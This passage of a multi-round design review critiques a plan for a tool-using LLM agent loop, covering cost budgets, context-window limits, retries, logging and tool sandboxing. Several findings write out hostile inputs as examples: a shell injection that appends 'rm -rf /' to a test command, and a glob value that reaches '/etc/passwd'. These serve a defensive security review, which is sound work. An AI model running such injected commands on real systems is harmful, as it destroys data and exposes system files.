| R2-S6 | Data | Low | Handle binary files in `_read_file` gracefully. | Reading a binary file (e.g., `.pyc`, image) as text will raise encoding errors or confuse the LLM. | `ExplorePhaseHandler._read_file` | Unit test: Attempt to read a binary file; verify it returns a descriptive string ("Binary file skipped") instead of crashing/garbage. |
| R2-S7 | Ops | Low | Explicitly log the "Thought" (text before tool use) in OTel span events. | The reasoning behind a tool call is critical for debugging agent performance. Capturing just the tool name/input loses the "why". | `ToolUsingPhaseHandler.execute` (OTel instrumentation) | Inspect OTel span attributes in integration test; ensure pre-tool text is captured. |
| R2-S8 | Architecture | Low | Define `_build_initial_message` as an abstract method in `ToolUsingPhaseHandler`. | The plan mentions this in the "Risks" section but doesn't explicitly mandate it in the class definition. It is essential for subclass implementation. | `ToolUsingPhaseHandler` (ABC definition) | Verify `TypeError` if subclass fails to implement it. |

#### Feature Requirements Suggestions
| ID | Issue | Description |
| ---- | ---- | ---- |
| R2-F1 | Ambiguity | **Requirement:** "Full cost tracking". **Issue:** The plan calculates cost but doesn't specify if/how this integrates with the *global* workflow budget during the execution loop. If the explore phase burns $4.00 of a $5.00 budget, does it stop immediately or wait for the phase to finish? |

#### Requirements Coverage
| Feature Doc Section | Plan Step(s) | Coverage | Gaps |
| ---- | ---- | ---- | ---- |
| **Tool Registry** | `get_tools` abstract method | Full | None |
| **Agent Loop** | `execute` loop logic | Full | None |
| **Bounded Iteration** | `max_iterations`, `token_budget` | Full | None |
| **Cost Tracking** | `_calculate_cost`, metadata return | Partial | Integration with global workflow budget during loop execution is implicit/unclear. |
| **OTel Instrumentation** | Section 7 (OTel) | Full | None |
| **Safety (Sandboxing)** | `_validate_path`, `project_root` | Full | None |
| **Safety (Read-only)** | Tool definitions | Full | `shell=True` in `run_test` (addressed in R2-S1). |

#### Review Round R3

- **Reviewer**: claude-4 (claude-opus-4-6)
- **Date**: 2026-02-20 02:10:05 UTC
- **Scope**: Architecture-focused review

| ID | Area | Severity | Suggestion | Rationale | Proposed Placement | Validation Approach |
| ---- | ---- | ---- | ---- | ---- | ---- | ---- |
| R3-S1 | data | high | Define a schema for the `messages` list accumulated during the agent loop, including maximum memory bounds and a truncation/summarization strategy for long conversations. | The agent loop appends every assistant response and every tool result to `messages`, which is re-sent on each LLM call. With 15 iterations and large file reads (up to 10K lines), the conversation can grow to hundreds of thousands of tokens — far exceeding both `token_budget` and the model's context window. `token_budget` only tracks *cumulative* usage, not the size of the prompt being sent. There is no mechanism to prune, summarize, or sliding-window the message history. This is a data integrity and cost issue: the LLM will either error on context overflow or silently lose early context. | Section 4 (Agent Loop Implementation) — add a "Message History Management" subsection specifying: (1) max retained message size in tokens, (2) truncation strategy (e.g., summarize tool results beyond N tokens, drop oldest tool results keeping the initial user message), (3) how tool result content is capped before appending (distinct from the 5K/10K caps on tool output, which control what's *returned* but not what's *retained* across turns). | Unit test: mock a 15-iteration loop where each tool returns 5K chars; assert the prompt sent to the LLM on iteration 15 is under the model's context window. Integration test: verify conversation truncation preserves the initial user message and most recent 3 tool exchanges. |
| R3-S2 | interfaces | high | Specify the return type contract for `handle_tool_use` — it currently returns `str` but should return a structured `ToolResult` type that distinguishes success, expected failure, and content truncation. | R1-F1 was applied, establishing that `ToolResult(is_error=True)` handles expected failures. However, the abstract method signature in Section 4 still shows `-> str`. The plan never defines the `ToolResult` dataclass or updates the signature. Subclass implementers have no concrete type to import, and the base class `_execute_tool` wrapper has no defined behavior for catching exceptions vs. receiving `ToolResult`. The interface is under-specified at the contract boundary. | Section 4 (Abstract Methods) — change `handle_tool_use` signature to `-> ToolResult`. Add `ToolResult` dataclass definition to `tool_using_handler.py` with fields: `content: str`, `is_error: bool = False`, `truncated: bool = False`. Update Section 5 tool implementations to return `ToolResult` instances. Define `_execute_tool` wrapper: catches exceptions → `ToolResult(content=str(e), is_error=True)`, passes through `ToolResult` from `handle_tool_use`. | Verify: `ToolResult` is importable from the module. Unit tests assert `_execute_tool` wraps unexpected exceptions. Type checker confirms subclass return types match. |
| R3-S3 | interfaces | high | Define the `_call_llm` method signature, error handling, and retry policy explicitly. | `execute()` calls `self._call_llm(system_prompt, messages, tools)` but this method is never defined anywhere — not as abstract, not as concrete. There's no specification of: (1) what happens on Anthropic API errors (rate limits, 500s, overloaded), (2) whether retries are handled here or delegated to `on_retry`, (3) how `max_tokens` is determined (hardcoded 8192 in Section 3 but not parameterized). This is the most critical internal interface in the class — every iteration depends on it. | New subsection in Section 4 titled "LLM Call Method" — define `_call_llm` as a concrete (non-abstract) method on `ToolUsingPhaseHandler`. Specify: signature `(system_prompt: str, messages: list[dict], tools: list[dict]) -> anthropic.types.Message`, retry policy (exponential backoff, max 3 retries for transient errors), which exceptions propagate vs. are retried, and `max_tokens` as a constructor parameter with default 8192. | Unit test: mock Anthropic client to raise `RateLimitError` twice then succeed — assert 3 calls made. Unit test: mock `InternalServerError` beyond retry limit — assert `PhaseExecutionError` raised with cause chain. |
| R3-S4 | validation | critical | Add input validation for tool schemas at handler registration time, not just at LLM call time. | `get_tools()` returns arbitrary dicts that are passed directly to the Anthropic API. If a subclass returns malformed tool schemas (missing `input_schema`, wrong types, duplicate names), the error surfaces only at runtime during the first LLM call — deep inside the agent loop with no clear error message. There's no validation that tool names are unique, that schemas are valid JSON Schema, or that the tools list is non-empty. This is especially dangerous because `get_tools()` is abstract and will be implemented by external developers. | Section 4 — add a `_validate_tools()` method called in `execute()` before the loop starts (or in `__init_subclass__`). Validate: (1) each tool has `name`, `description`, `input_schema` keys, (2) `input_schema` has `type: "object"` and `properties`, (3) no duplicate tool names, (4) tools list is non-empty. Raise `ValueError` with specific message on failure. | Unit test: subclass with duplicate tool names → `ValueError`. Unit test: subclass with missing `input_schema` → `ValueError`. Unit test: valid tools → no error. |
| R3-S5 | validation | high | Validate `parse_final_output` return value against `ExplorePhaseOutput` schema before writing to context. | The plan says `context["localization"] = output` where `output` comes from `parse_final_output`. Risk 4 acknowledges the LLM may not follow expected format and mentions returning partial results with `parse_error: True`. But there's no validation between `parse_final_output` returning a dict and that dict being written to context. If `fault_files` is missing or `root_cause` is None, downstream DESIGN phase will fail with an opaque `KeyError`. The exit validation in `context_schema.py` (Section 8) would catch this, but only if it runs — and the plan doesn't specify whether exit validation runs on partial results or skips them. | Section 8 (Context Validation) — specify that `ExplorePhaseOutput` validation runs on the output of `parse_final_output` *before* writing to context. On validation failure with `parse_error: True`, write to `context["localization"]` with a `partial: True` flag and log a warning. On validation failure without `parse_error`, raise `PhaseExecutionError`. Define which fields are required vs. optional in `ExplorePhaseOutput` (e.g., `fault_files` required, `affected_tests` optional). | Unit test: `parse_final_output` returns dict missing `fault_files` → `PhaseExecutionError`. Unit test: returns dict with `parse_error: True` and missing fields → written to context with `partial: True`. Integration test: partial localization triggers DESIGN phase graceful degradation. |
| R3-S6 | ops | high | Define structured logging for the agent loop with correlation to the workflow run, including log levels for normal operation vs. debugging. | The plan specifies OTel spans and events but no structured logging. In production, operators need to troubleshoot failed explorations without access to trace backends. There's no specification of: (1) what gets logged at INFO level (iteration count, tool calls, cost), (2) what gets logged at DEBUG (full tool inputs/outputs, message history), (3) how logs correlate to the workflow run ID. The existing codebase uses `structlog` — the plan should follow suit. | New subsection in Section 7 titled "Structured Logging" — specify: INFO log per iteration (iteration number, tool names called, cumulative tokens, elapsed time), WARNING log on budget/iteration limit reached, ERROR log on tool execution failures, DEBUG log with full tool input/output (gated by log level to avoid log volume explosion). All log entries include `workflow_run_id`, `phase`, `iteration` as bound context. | Review: verify structlog is used consistently. Integration test: capture log output during a 3-iteration run, assert INFO entries contain expected fields. Ops test: verify DEBUG-level logs are suppressible without losing INFO-level visibility. |
| R3-S7 | ops | high | Specify behavior and recoverability when the agent loop terminates abnormally (mid-iteration crash, Anthropic outage, OOM). | The plan defines clean stop conditions (end_turn, max_iterations, token_budget) but doesn't address dirty stops. If the process crashes after iteration 5 of 15 — with 5 tool results already gathered — there's no checkpoint, no partial result persisted, and no way to resume. The existing workflow has `on_retry` but the plan doesn't specify how `on_retry` interacts with the agent loop. Does retry restart from iteration 0? Does it resume? Is the partial message history preserved? For a phase that can run for minutes and cost dollars, losing all progress on transient failure is a significant ops risk. | Section 11 (Risks) — add Risk 7: "Agent Loop Crash Recovery". Specify: (1) `on_retry` restarts the loop from iteration 0 (no resume — message history is LLM-specific and non-resumable), (2) before each LLM call, persist a lightweight checkpoint (`{iteration, tool_calls_made, cumulative_tokens, last_tool_results}`) to the workflow's checkpoint mechanism, (3) on retry, the checkpoint is logged for debugging but not used for resumption, (4) `execute()` wraps the entire loop in try/except, ensuring partial metadata (iterations completed, cost so far) is always returned even on failure. | Unit test: mock LLM to raise on iteration 3 — assert returned metadata includes `iterations: 2` and `cost` for completed iterations. Unit test: verify `on_retry` is called with the caught exception. Integration test: kill workflow mid-explore, restart, verify checkpoint contains partial explore data. |
| R3-S8 | data | high | Specify how `relevant_code` snippets in the localization output are bounded and deduplicated to prevent context bloat in downstream phases. | The `ExplorePhaseOutput` includes `relevant_code: dict[str, str]` mapping file ranges to code snippets. There's no limit on how many snippets or how large they can be. If the LLM identifies 20 relevant locations with 50-line snippets each, that's 1000+ lines injected into the DESIGN phase prompt. The plan addresses tool output caps (10K lines, 5K chars) but not the *aggregated* output that flows downstream. This is a data contract gap between EXPLORE and DESIGN. | Section 8 (Context Flow) — specify: (1) `relevant_code` is capped at 10 entries, (2) each snippet is capped at 50 lines, (3) `parse_final_output` deduplicates overlapping ranges (e.g., `auth.py:70-85` and `auth.py:73-90` merge to `auth.py:70-90`), (4) total `relevant_code` content is capped at 5,000 characters. Add these as validation rules in `ExplorePhaseOutput`. | Unit test: `parse_final_output` with 20 snippets → only 10 kept (most relevant). Unit test: overlapping ranges merged correctly. Validation test: `ExplorePhaseOutput` rejects `relevant_code` exceeding 5K chars total. |
| R3-S9 | validation | high | Add end-to-end contract tests that verify the tool schemas returned by `get_tools()` are accepted by the Anthropic API's tool format. | The tool schemas in Section 5 are hand-written dicts matching the Anthropic tool_use format. There's no automated check that these schemas remain valid as the Anthropic SDK evolves. A breaking change in the SDK's tool schema validation would surface only at runtime. R3-S4 validates structural correctness internally, but doesn't validate against the actual API contract. | Section 9 (Unit Test Plan) — add contract tests: (1) validate each tool schema against `anthropic.types.ToolParam` (the SDK's type), (2) create a mock `messages.create` call with the tools and assert no `BadRequestError`, (3) run these tests in CI against the pinned SDK version. If the SDK doesn't expose schema validation, use the SDK's Pydantic models to parse the tool dicts. | CI: contract tests run on every SDK version bump. Unit test: each of the 4 tool schemas parses successfully as `ToolParam`. Negative test: intentionally malformed schema fails validation. |
| R3-S10 | interfaces | medium | Define the `_calculate_cost` method signature and specify whether it accounts for tool execution compute cost or only LLM token cost. | `execute()` calls `self._calculate_cost(total_input_tokens, total_output_tokens)` but this method is never defined. Section 3 mentions using `PricingService.calculate_cost_breakdown()` and Risk 3 says to reuse it, but the actual method signature, its parameters, and what it returns are unspecified. Additionally, `run_test` subprocess execution has real compute cost (CPU time, potential CI minutes) that isn't tracked. The plan should explicitly state whether cost is LLM-only or includes compute, so operators can budget accurately. | Section 4 — define `_calculate_cost(input_tokens: int, output_tokens: int) -> float` as a concrete method that delegates to `PricingService.calculate_cost_breakdown(model=self.model, input_tokens=input_tokens, output_tokens=output_tokens)` and returns the total USD amount. Explicitly document: "Cost reflects LLM token usage only. Subprocess compute cost (e.g., test execution) is not tracked in v1. Future versions may add compute cost estimation." | Unit test: mock `PricingService` and verify `_calculate_cost` delegates correctly. Unit test: verify returned cost is a float. Documentation review: confirm cost semantics are clear to operators setting `cost_budget`. |

#### Feature Requirements Suggestions

| ID | Section | Issue Type | Description | Impact | Suggested Resolution |
| ---- | ---- | ---- | ---- | ---- | ---- |
| R3-F1 | Interface Design — `execute()` | Missing error handling | The `execute()` method in the requirements shows no try/except around the agent loop. If `_call_llm` or `_execute_tool` raises an unhandled exception, the entire phase fails with no partial results and no cost tracking for the tokens already consumed. The requirements should specify error handling behavior for the non-overridable `execute()` method. | Operators lose cost visibility on failed runs. Retry logic has no information about how far the loop progressed. Budget tracking becomes inaccurate (consumed tokens not reported). | Wrap the agent loop in try/except. On any exception, still compute and return cost for tokens consumed so far. Include `error` key in metadata. Re-raise as `PhaseExecutionError` with partial results attached. |
| R3-F2 | Interface Design — `handle_tool_use` | Missing concurrency specification | The requirements show `handle_tool_use` called sequentially for each tool_use block in a response. The LLM can return multiple tool_use blocks in a single response (acknowledged in the unit test plan: `test_multiple_tool_calls_in_single_response`). The requirements don't specify whether multiple tool calls should execute sequentially or concurrently. | Sequential execution of independent tool calls (e.g., reading 3 different files) wastes wall-clock time. Concurrent execution risks resource contention and complicates error handling. The requirements should make an explicit choice. | Specify: v1 executes tool calls sequentially within an iteration. Add a `concurrent_tools: bool = False` constructor parameter reserved for future use. Document the rationale: sequential is simpler, safer, and sufficient for v1 where iterations are cheap relative to LLM calls. |
| R3-F3 | Tool Safety — Sandboxing | Missing specification | The requirements say "no network access" for `run_test` but provide no mechanism to enforce it. `subprocess.run` with `shell=True` does not restrict network access. On Linux, this would require `unshare --net`, seccomp, or a container. On macOS, there's no simple equivalent. The requirement is stated but unimplementable as specified. | Either the requirement is silently violated (tests make network calls), or implementers add platform-specific sandboxing that's out of scope for the 2-day estimate. | Change "no network access" to "network access is not prevented in v1; the tool relies on the command whitelist to limit execution to test runners. Production deployments SHOULD run the explore phase in a network-isolated container." This makes the security boundary honest. |
| R3-F4 | Context Flow | Missing failure mode specification | The context flow shows a happy path where `context["localization"]` is fully populated. The requirements don't specify what happens if EXPLORE produces partial or empty results. Does DESIGN phase skip? Does it fall back to non-localized mode? Does the workflow abort? | Downstream phases can't distinguish "EXPLORE ran and found nothing" from "EXPLORE failed." Operators can't configure fallback behavior. | Add to Context Flow: `context["localization"]` MUST always be written (even on partial failure). Include a `confidence: float` field (0.0-1.0) and `partial: bool` field. DESIGN phase checks `confidence > 0.3` to use localization, otherwise falls back to full-context mode. |

#### Requirements Coverage

| Feature Doc Section | Plan Step(s) | Coverage | Gaps |
| ---- | ---- | ---- | ---- |
| AbstractPhaseHandler (existing — unchanged) | Section 1 (Architecture Summary) | Full | None — plan correctly leaves it unchanged. |
| ToolUsingPhaseHandler class + constructor | Section 4 (Agent Loop), Section 2 (File Breakdown) | Partial | `_call_llm` and `_calculate_cost` methods called but never defined. `ToolResult` type referenced (via R1-F1 applied) but not specified in the plan. |
| `get_tools()` abstract method | Section 4 (Abstract Methods), Section 5 (Tool Implementations) | Full | None. |
| `handle_tool_use()` abstract method | Section 4 (Abstract Methods), Section 5 (Tool Implementations) | Partial | Return type still shows `str` in plan despite R1-F1 applying `ToolResult`. Error handling contract between base class wrapper and subclass is unspecified. |
| `get_system_prompt()` abstract method | Section 4 (Abstract Methods), Section 5 (ExplorePhaseHandler) | Full | None. |
| `parse_final_output()` abstract method | Section 4 (Abstract Methods), Risk 4 | Partial | No validation of output before writing to context. No specification of behavior on parse failure beyond "return partial result." |
| `execute()` agent loop | Section 4 (Agent Loop Implementation) | Partial | No error handling around the loop. No message history management for long conversations. `_call_llm` undefined. |
| ExplorePhaseHandler concrete class | Section 5 (Tool Implementations) | Full | Minor: `_build_initial_message` shown but not in base class abstract methods list (R1-F2 applied but plan Section 4 now includes it). |
| Tool Safety — Sandboxing | Section 6 (Sandboxing and Safety) | Partial | "No network access" for `run_test` is stated but no enforcement mechanism specified. `shell=True` subprocess is a known risk vector beyond just command whitelisting. |
| Tool Safety — Resource Limits | Section 6 (Resource Limits table) | Full | None — all limits specified with defaults and enforcement points. |
| Tool Safety — No Destructive Operations | Section 6 (No Destructive Operations) | Full | None. |
| OTel Instrumentation | Section 7 (OTel Instrumentation) | Full | No structured logging specified (OTel spans only). |
| Integration — Phase Registration | Section 8 (WorkflowPhase Enum) | Full | R1-F4 applied — uses enum consistently. |
| Integration — Context Flow | Section 8 (Context Flow, Context Validation) | Partial | No specification for partial/failed localization. No bounds on `relevant_code` size flowing to DESIGN. |
| Estimated Effort (2 days) | Section 12 (Implementation Sequencing) | Full | Plan adds a Phase 5 buffer day, consistent with estimate. |
| Dependencies | Section 2 (File Breakdown), Critical Files | Full | No new dependencies needed — confirmed. |
| Open Question 1 (run_test in Explore) | Section 5, Section 6 | Full | Plan includes `run_test` with whitelist — question answered affirmatively. |
| Open Question 2 (streaming) | Section 3 (API Call Pattern) | Full | Plan uses non-streaming — question answered. |
| Open Question 3 (non-Python projects) | Not addressed | None | Plan doesn't mention non-Python project support or limitations. The `search_codebase` tool uses `grep` which is language-agnostic, but `get_system_prompt` references Python-specific context. Should document language limitations. |

**Endorsements** (prior untriaged suggestions this reviewer agrees with):
- None — all prior Appendix C suggestions from R1 and R2 have been triaged to Appendix A or B.

#### Review Round R4

- **Reviewer**: gemini-3 (gemini-3-pro-preview)
- **Date**: 2026-02-20 02:12:13 UTC
- **Scope**: Architecture-focused review

| ID | Area | Severity | Suggestion | Rationale | Proposed Placement | Validation Approach |
| ---- | ---- | ---- | ---- | ---- | ---- | ---- |
| R4-S1 | validation | critical | Anchor the `run_test` whitelist regex with `$` (e.g., `^...$`) and ensure it rejects shell separators (`;`, `|`, `&&`) or newlines. | The current regex `^...` combined with `shell=True` allows command injection (e.g., `make test; rm -rf /`). This is a critical security vulnerability in the "safe" toolset. | Section 5 (`_run_test`) and Section 6 (Sandboxing). | Unit test `test_run_test_injection_fails` attempting `make test; echo pwned`. |
| R4-S2 | ops | high | Add `cost_budget_usd` to `__init__` and calculate `token_budget` dynamically based on the model's price per token. | `token_budget` (50k) is hardcoded but cost varies 100x between models. Users setting a global $5 budget need the handler to respect that value, not an arbitrary token count that might cost $0.10 or $10.00. | Section 4 (Agent Loop) and `__init__`. | Unit test `test_cost_budget_calculates_correct_token_limit`. |
| R4-S3 | data | high | Define a fallback strategy for `parse_final_output` failure that respects `ExplorePhaseOutput` schema (e.g., return "UNKNOWN" for required fields) or explicitly fail the phase. | The plan says "return partial result with parse_error: True", but if the context schema requires `fault_files` (list), a partial result missing this key will crash the workflow during context validation. | Section 4 (Output Parsing) and Section 11 (Risk 4). | Integration test `test_explore_parse_failure_does_not_crash_workflow`. |
| R4-S4 | interfaces | medium | Add `enabled_tools: list[str] = None` to `__init__` to allow dynamic enabling/disabling of tools (especially `run_test`). | Users may want to run exploration without the risk of executing code (`run_test`), even if sandboxed. Hardcoding the toolset requires subclassing to change it. | `ToolUsingPhaseHandler.__init__` and `get_tools`. | Unit test `test_disabled_tools_are_not_exposed`. |
| R4-S5 | ops | low | Truncate the `explore.fault_files` OTel attribute (e.g., to 10 items or 1KB string). | Large lists of files in attributes can cause span rejection or truncation in collectors. Unbounded JSON serialization is risky for telemetry. | Section 7 (OTel Instrumentation). | Unit test `test_otel_attributes_are_truncated`. |
| R4-S6 | validation | medium | Use process groups (`start_new_session=True`) and `os.killpg` for `run_test` timeout enforcement. | `subprocess.run(timeout=...)` with `shell=True` only kills the shell, not necessarily the child processes (e.g., the actual test runner), leading to zombie processes or resource exhaustion. | Section 5 (`_run_test`). | Unit test `test_run_test_timeout_kills_process_tree`. |
| R4-S7 | data | medium | Cap line length in `_read_file` and `_search_codebase` (e.g., 1000 chars/line). | Minified files (one line, 1MB) will bypass the "10,000 lines" cap and blow up the context window / token budget in a single tool call. | Section 5 (`_read_file`, `_search_codebase`). | Unit test `test_read_file_truncates_long_lines`. |
| R4-S8 | data | medium | Explicitly define `localization` as an *optional* entry requirement for the DESIGN phase, or mandate Explore. | The plan says Design "reads context['localization']". If Explore is skipped (hybrid workflow), Design must handle the missing key gracefully. | Section 8 (Context Validation). | Integration test `test_design_phase_works_without_explore_context`. |
| R4-S9 | interfaces | medium | Define `on_retry` behavior: does it reset the agent loop (tokens/history) or resume? | The ABC has `on_retry`. If the phase times out or errors, the retry logic needs to know if it should clear the conversation history to avoid repeating the same error loop. | Section 4 (Agent Loop). | Unit test `test_retry_resets_agent_state`. |
| R4-S10 | architecture | medium | Abstract the LLM client behind a `_call_llm` interface or use `ClaudeAgent` properly, rather than hardcoding `anthropic.Client`. | Hardcoding `anthropic` prevents using other providers supported by startd8-sdk (OpenAI, Vertex). It breaks the SDK's model-agnostic promise. | Section 3 (Anthropic SDK) and Section 4. | Code review check for `anthropic` import in base class. |

#### Feature Requirements Suggestions
| ID | Section | Issue Type | Description | Impact | Suggested Resolution |
| ---- | ---- | ---- | ---- | ---- | ---- |
| R4-F1 | Tool Safety — `run_test` | Security | The requirement specifies a whitelist regex but does not mandate anchors (`^...$`) or shell injection prevention. | `shell=True` with unanchored regex allows `make test; rm -rf /`. | Require whitelist regex to be strictly anchored to start and end of string, or forbid shell metacharacters. |
| R4-F2 | Resource Limits | Conflict | Requirement asks for "Full cost tracking (compatible with budget enforcement)" but defines `token_budget` (int). | Users setting a $5.00 budget expect the phase to stop at $5.00, not at 50k tokens (which could be $0.15 or $15.00 depending on model). | Add `cost_budget` parameter to the interface and require dynamic token limits based on model pricing. |

#### Requirements Coverage
| Feature Doc Section | Plan Step(s) | Coverage | Gaps |
| :--- | :--- | :--- | :--- |
| **Tool Registry** | Step 5 (`get_tools`) | Full | None |
| **Agent Loop** | Step 4 | Full | None |
| **Bounded Iteration** | Step 4, Step 6 | Full | None |
| **Full Cost Tracking** | Step 4, Step 11 | Partial | Cost is calculated but `token_budget` is static; lacks dynamic link to global cost budget (see R4-S2). |
| **OTel Instrumentation** | Step 7 | Full | None |
| **Tool Safety (Sandboxing)** | Step 6 | Partial | `run_test` regex is insecure (R4-S1); Subprocess cleanup is weak (R4-S6). |
| **Integration** | Step 8 | Partial | Missing optionality definition for downstream Design phase (R4-S8). |

#### Review Round R5

- **Reviewer**: claude-4 (claude-opus-4-6)
- **Date**: 2026-02-20 02:17:00 UTC
- **Scope**: Architecture-focused review

| ID | Area | Severity | Suggestion | Rationale | Proposed Placement | Validation Approach |
| ---- | ---- | ---- | ---- | ---- | ---- | ---- |
| R5-S1 | security | critical | `_search_codebase` uses `subprocess.run(["grep", ...])` but constructs `pattern` from untrusted LLM output. A malicious or hallucinated regex pattern can cause catastrophic backtracking (ReDoS), hanging the subprocess for the full `tool_timeout_seconds`. Additionally, `--include=<glob>` with LLM-supplied globs could match unintended paths. Add `re.compile(pattern)` pre-validation with a complexity bound (e.g., max pattern length 200 chars, disallow nested quantifiers) before passing to grep, and sanitize glob input to alphanumeric + `*` + `.` only. | Prior reviews addressed path traversal (R1-S1, R1-S5) and command injection in `run_test` (R4-S1, R4-F1), but `search_codebase` accepts two attacker-controlled string inputs (`pattern` and `file_glob`) that are passed directly to a subprocess. ReDoS via grep is a real denial-of-service vector, and glob injection (e.g., `--include=../../etc/passwd`) could leak files outside the intended scope depending on grep implementation. This is a second-order gap: the focus on `run_test` security left `search_codebase` under-scrutinized. | Section 5 (`_search_codebase`) — add input validation before subprocess invocation. Section 6 (Sandboxing and Safety) — add regex/glob sanitization to the safety table. | Unit test: `test_search_codebase_rejects_pathological_regex`, `test_search_codebase_sanitizes_glob`. Verify grep subprocess completes within 1s for all test patterns. |
| R5-S2 | architecture | high | The agent loop in Section 4 has no handling for Anthropic API rate limits (HTTP 429) or transient errors (5xx). A single 429 during iteration 8 of 15 will crash the loop and lose all prior tool results. Add retry-with-backoff for transient API errors (reuse existing SDK retry patterns from `ClaudeAgent`) with a configurable `max_api_retries: int = 3` per LLM call within the loop. | R3-F1/R3-S7 addressed wrapping the loop in try/except for preserving partial results, but this only handles the outer boundary. Inside the loop, each `_call_llm` invocation is a network call subject to rate limiting and transient failures. The existing `on_retry` mechanism operates at the phase level (retrying the entire phase), which is wasteful for a multi-turn loop. Inner-loop retry is needed to avoid restarting a 10-iteration exploration because of a single 429 on iteration 8. | Section 4 (Agent Loop Implementation) — add inner-loop retry logic around `_call_llm`. Section 11 (Risks) — add Risk 7 for API transient failures. | Unit test: `test_llm_call_retries_on_429`, `test_llm_call_retries_on_500`, `test_llm_call_fails_after_max_retries`. Mock Anthropic client to return 429 then 200. |
| R5-S3 | data | high | The message history grows unboundedly across iterations. With 15 iterations, each returning multi-KB tool results, the messages array can exceed the model's context window before `token_budget` is hit (token_budget counts cumulative I/O tokens, but context window is a hard per-request limit). The plan has no context window management strategy — no message truncation, summarization, or sliding window. Add a `max_context_tokens` parameter (defaulting to model context limit minus `max_tokens` response reserve) and implement oldest-tool-result truncation when approaching the limit. | R1-F6 addressed token budget sizing guidance, and R4-F2 added cost_budget, but neither addresses the distinct problem of context window overflow. Token budget tracks cumulative spend across all iterations; context window is a per-request constraint. A 15-iteration loop with verbose tool results can easily exceed 200K tokens in the messages array even if cumulative I/O tokens are under budget (because input tokens are re-counted each request). This is a correctness bug, not just an efficiency issue — the API will return an error. | Section 4 (Message Management) — add context window management strategy. Section 6 (Resource Limits) — add `max_context_tokens` to limits table. | Unit test: `test_message_history_truncation_when_approaching_context_limit`. Integration test with mock that returns oversized tool results across many iterations. |
| R5-S4 | interfaces | medium | `handle_tool_use` returns `str` but the requirements doc (R1-F1 resolution) specifies a `ToolResult` type with `is_error` field. The plan's Section 5 still says "return error string (don't raise — LLM should see errors)" which contradicts the applied R1-S4 suggestion. The plan's interface section (Section 4 abstract methods) still lists `handle_tool_use(...) -> str`. Update to return `ToolResult` consistently. | R1-F1 was marked as applied, resolving the contradiction via `ToolResult(content, is_error)`. However, the plan text was never actually updated to reflect this — Section 4 and Section 5 still describe the old `str` return type. This is a residual inconsistency: the resolution was accepted in Appendix A but the plan body still contradicts it. Implementers reading the plan (not the appendix) will use the wrong return type. | Section 4 (Abstract Methods) — change `handle_tool_use` signature to `-> ToolResult`. Section 5 (all tool implementations) — update return descriptions. Add `ToolResult` dataclass to `tool_using_handler.py` file table. | Code review check: verify `handle_tool_use` signature matches `ToolResult` return type in implementation. |
| R5-S5 | ops | medium | The plan specifies OTel instrumentation (Section 7) but provides no structured logging for the agent loop. OTel traces are useful for distributed tracing but are not searchable the way structured logs are. When debugging a failed exploration in production, operators need log lines like `explore.iteration=5 tool=read_file path=src/auth.py duration_ms=45 result_bytes=2340` that can be queried in a log aggregator. Add structured logging at INFO level per tool call and at WARN level for budget/iteration limit hits. | R1-S7 and R3-S7 addressed OTel and partial-failure observability, but production debugging typically starts with logs, not traces. The plan has zero logging statements described. OTel spans require a trace backend to be configured; structured logs work with any log aggregator and are the first place operators look. This is especially important for the `run_test` tool where subprocess failures need log-level visibility. | Section 7 (OTel Instrumentation) — add a subsection on structured logging. Section 9 (Unit Test Plan) — add test verifying log output. | Verify that running the agent loop with `logging.DEBUG` produces parseable structured log entries for each tool call. |
| R5-S6 | risks | high | The plan assumes `PricingService.calculate_cost_breakdown()` (Risk 3, Section 11) has pricing data for all models that might be passed via the `model` parameter. If a user passes a new model string (e.g., `claude-sonnet-4-20250514` after a pricing update), cost calculation silently returns 0 or raises. The plan doesn't specify fallback behavior for unknown models. Given that R4-F2 was accepted (adding `cost_budget` parameter with dynamic token limits based on model pricing), unknown-model handling becomes critical — if pricing lookup fails, token limits can't be computed from cost budget. | R4-F2's acceptance creates a hard dependency on PricingService having accurate data for the configured model. This is a second-order risk introduced by an accepted suggestion. The base class `__init__` must validate that the model is known to PricingService at construction time (fail-fast) rather than discovering the gap mid-loop when cost calculation fails. | Section 11 (Risks) — add Risk 7 for unknown model pricing. Section 4 or `__init__` — add model validation against PricingService at construction. | Unit test: `test_init_raises_on_unknown_model`. `test_cost_calculation_with_known_model_succeeds`. |
| R5-S7 | validation | medium | The integration test plan (Section 10) has no test for the interaction between `max_iterations` and `token_budget` when both limits are close to being hit simultaneously. Specifically: what happens when iteration 14 (of 15 max) produces a response that pushes tokens past `token_budget`? The loop should exit cleanly, but the current logic checks token budget _after_ adding response tokens and _before_ tool execution — meaning the token budget check could trigger between the LLM response and tool execution, resulting in tool_use blocks that are never executed. The LLM will see an incomplete conversation if this state is serialized. | This is an edge case at the intersection of two stop conditions. The plan's Section 4 says "Check AFTER adding response tokens but BEFORE executing tools" — but if `stop_reason == "tool_use"` and the budget is exceeded, the assistant message with tool_use blocks is appended but the tool_results are never appended. `parse_final_output` then receives a conversation ending with an assistant tool_use message with no results, which is malformed. | Section 4 (Stop Conditions) — specify behavior when budget exceeded mid-tool_use: either don't append the assistant message, or append a synthetic tool_result indicating budget exhaustion. Section 9 — add test case. | Unit test: `test_token_budget_exceeded_during_tool_use_produces_valid_conversation`. Verify `parse_final_output` receives well-formed message history. |
| R5-S8 | data | medium | `parse_final_output` receives the full `messages` list and `context`, but there's no specification for what happens when the LLM never produces an `end_turn` (all 15 iterations were tool_use, or budget was hit). The final message in `messages` would be a user message (tool_results), not an assistant message. The current code only appends assistant messages on `end_turn` — so after max_iterations with tool_use on every turn, the last assistant message IS appended (line: `messages.append({"role": "assistant", "content": assistant_content})`), but it contains tool_use blocks, not a final answer. `parse_final_output` must handle extracting a report from a conversation that never concluded. | R3-F4 added confidence/partial fields to the output, which helps downstream phases handle incomplete results. But the actual _parsing_ strategy for incomplete conversations is unspecified. The LLM may have written partial analysis in TextBlocks alongside tool_use blocks. `parse_final_output` needs explicit guidance: scan all assistant messages for TextBlocks, concatenate them, attempt extraction, set `confidence` accordingly. | Section 5 (`parse_final_output` in ExplorePhaseHandler) — add specification for handling conversations that ended without `end_turn`. Risk 4 (Output Parsing Robustness) — extend to cover this case. | Unit test: `test_parse_final_output_with_no_end_turn`, `test_parse_final_output_extracts_from_mid_conversation_text_blocks`. |
